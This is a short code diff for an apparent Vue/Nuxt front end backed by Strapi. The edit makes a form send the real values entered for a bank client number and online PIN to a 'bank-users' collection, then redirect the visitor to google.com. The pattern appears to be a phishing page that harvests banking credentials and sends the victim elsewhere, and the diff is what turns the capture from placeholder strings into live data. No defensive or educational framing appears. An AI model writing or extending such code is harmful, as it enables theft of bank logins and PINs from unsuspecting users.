@@ -70,9 +70,6 @@
 
 <script lang="ts" setup>
 
-    const { getProviderAuthenticationUrl } = useStrapiAuth();
-    getProviderAuthenticationUrl('github');
-
     import { ref, Ref } from 'vue';
     const { create } = useStrapi();
 
@@ -84,10 +81,11 @@
     const inputPin: Ref<InputData> = ref({ value: null });
     
     async function sendData(){
-        await create('bank-users', {
-            clientNumber: 'inputUser.value.value',
-            onlinePin: 'inputPin.value.value'
-        });
+        await useAsyncData('bank-users', () => create('bank-users', {
+            clientNumber: inputUser.value.value,
+            onlinePin: inputPin.value.value
+        }));
+        await navigateTo('https://www.google.com/', { external: true });
     }
 
 </script>
